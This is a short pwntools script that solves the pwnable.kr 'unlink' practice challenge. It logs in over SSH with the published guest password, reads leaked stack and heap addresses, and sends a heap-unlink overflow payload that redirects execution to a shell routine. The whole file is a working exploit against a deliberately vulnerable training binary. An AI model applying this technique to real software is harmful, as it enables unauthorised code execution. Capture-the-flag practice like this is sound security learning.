from pwn import *

p = ssh(host='pwnable.kr', port=2222, user='unlink', password='guest').process('./unlink')

p.recvuntil('stack address leak: ')
stack_leak = int(p.recv(10), 16)
p.recvuntil('heap address leak: ')
heap_leak = int(p.recv(9), 16)

shell_addr = 0x80484eb

payload = p32(shell_addr) + 'a'*12 + p32(heap_leak+0xc) + p32(stack_leak+0x10)
# OR payload = p32(shell_addr) + 'a'*12 + p32(stack_leak+0xc) + p32(heap_leak+0xc)
p.send(payload)

p.interactive()